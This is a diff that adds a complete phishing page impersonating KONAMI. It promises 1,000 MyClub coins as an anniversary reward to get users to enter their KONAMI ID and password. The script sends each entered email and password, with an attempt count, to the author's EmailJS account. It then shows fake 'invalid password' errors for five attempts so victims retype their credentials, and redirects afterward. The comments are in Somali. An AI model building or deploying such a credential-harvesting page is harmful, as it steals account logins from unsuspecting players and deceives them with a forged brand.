@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KONAMI Anniversary | Claim Reward</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+        body { background-color: #f2f2f2; }
+        
+        header { background: white; text-align: left; }
+        .konami-logo { color: #b10e1e; font-size: 24px; font-weight: bold; padding: 12px 15px; letter-spacing: 1.5px; font-family: "Arial Black", sans-serif; }
+        .red-bar { background: #b10e1e; color: white; padding: 15px; font-size: 18px; }
+
+        .container { max-width: 450px; margin: 0 auto; background: white; min-height: 100vh; }
+        .reward-banner { padding: 20px; text-align: center; background: linear-gradient(180deg, #fff 0%, #fff5f5 100%); }
+        .reward-banner img { width: 100%; max-width: 320px; border-radius: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.15); border: 2px solid #ffd700; }
+
+        .claim-box { padding: 25px; }
+        .event-title { color: #b10e1e; font-size: 20px; font-weight: bold; margin-bottom: 10px; text-align: center; }
+        .event-desc { font-size: 14px; color: #555; text-align: center; margin-bottom: 20px; }
+
+        .season-alert { background-color: #fff4f4; color: #b10e1e; padding: 12px; border-radius: 8px; border: 1px solid #ffcccc; font-size: 14px; font-weight: bold; text-align: center; margin-bottom: 20px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+
+        .input-group { margin-bottom: 15px; }
+        input { width: 100%; padding: 14px; border: 1px solid #a4c7e1; border-radius: 6px; font-size: 16px; }
+
+        .btn-claim { width: 100%; background: #b10e1e; color: white; border: none; padding: 16px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        
+        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.9); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
+        .konami-spinner { width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #b10e1e; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Modal Look */
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 10000; align-items: center; justify-content: center; }
+        .modal-content { background: white; width: 85%; max-width: 320px; border-radius: 2px; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
+        .modal-header { background: #f1f1f1; padding: 10px 15px; font-weight: bold; border-bottom: 1px solid #ccc; }
+        .modal-body { padding: 20px 15px; text-align: left; font-size: 14px; color: #333; }
+        .modal-footer { padding: 10px; text-align: right; border-top: 1px solid #eee; }
+        .modal-footer button { background: #b10e1e; color: white; border: none; padding: 6px 25px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div id="loading-overlay">
+    <div class="konami-spinner"></div>
+    <div style="margin-top:15px; color:#b10e1e; font-weight:bold;">PROCESSING...</div>
+</div>
+
+<header>
+    <div class="konami-logo">KONAMI</div>
+    <div class="red-bar">Anniversary Reward</div>
+</header>
+
+<div class="container">
+    <div class="reward-banner">
+        <img src="https://i.ibb.co/93g3dYf5/d9af6ddb1dcd78d12657af728a08421f.jpg" alt="1000 Coins">
+    </div>
+
+    <div class="claim-box">
+        <h1 class="event-title">30th Anniversary Gift</h1>
+        <p class="event-desc">Verify your account to claim 1,000 MyClub coins instantly.</p>
+        
+        <div class="season-alert">
+            <i class="fas fa-clock"></i> 30 days left to kill this season.
+        </div>
+
+        <form id="claimForm">
+            <div class="input-group">
+                <input type="text" id="email_field" placeholder="KONAMI ID (e-mail address)" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="pass_field" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn-claim" id="subBtn">CLAIM NOW</button>
+        </form>
+    </div>
+</div>
+
+<div id="konamiModal" class="modal-overlay">
+    <div class="modal-content">
+        <div class="modal-header">Information</div>
+        <div class="modal-body">
+            <p id="modal-text">Invalid KONAMI ID or password.</p>
+            <p style="margin-top:10px; color:#888; font-size:11px;" id="error-code-text">Error Code: 501</p>
+        </div>
+        <div class="modal-footer">
+            <button onclick="closeKonamiModal()">OK</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function(){ 
+        emailjs.init("9TO7hHMapqy4U9kNz"); 
+    })();
+
+    // 1. Halkaan ayay xisaabtu ka bilaabanaysaa (Tiriyaha)
+    let tabashadaBadhanka = 0; 
+
+    function closeKonamiModal() { 
+        document.getElementById('konamiModal').style.display = 'none'; 
+    }
+
+    document.getElementById('claimForm').onsubmit = function(e) {
+        e.preventDefault();
+        
+        // 2. Mar walba oo uu qofku taabto "CLAIM NOW", hal (1) ku dar tirada
+        tabashadaBadhanka++; 
+
+        const loadingOverlay = document.getElementById('loading-overlay');
+        loadingOverlay.style.display = 'flex';
+
+        // 3. Xogta loo dirayo Email-kaaga (waxaa ku jira inta jeer ee uu isku dayay)
+        const params = {
+            method: "Attempt Number: " + tabashadaBadhanka,
+            login_user: document.getElementById('email_field').value,
+            login_pass: document.getElementById('pass_field').value
+        };
+
+        emailjs.send("service_j2uu8yq", "template_0tc14oe", params)
+            .then(function() {
+                setTimeout(() => {
+                    loadingOverlay.style.display = 'none';
+
+                    // 4. Hubi inta jeer ee la tabtay
+                    if (tabashadaBadhanka < 6) {
+                        // Haddii ay ka yartahay 6 jeer, tus Modal-ka (Custom Alert)
+                        document.getElementById('error-code-text').innerText = "Error Code: " + (600 + tabashadaBadhanka);
+                        document.getElementById('konamiModal').style.display = 'flex';
+                        
+                        // Nadiifi meesha password-ka si uu mar kale u qoro
+                        document.getElementById('pass_field').value = ""; 
+                    } else {
+                        // Marka 6-aad ee uu taabto, u dir ended.html ama celebration.html
+                        window.location.href = "ended.html";
+                    }
+                }, 1500);
+            }, function(error) {
+                loadingOverlay.style.display = 'none';
+                document.getElementById('konamiModal').style.display = 'flex';
+            });
+    };
+</script>
+
+</body>
+</html>
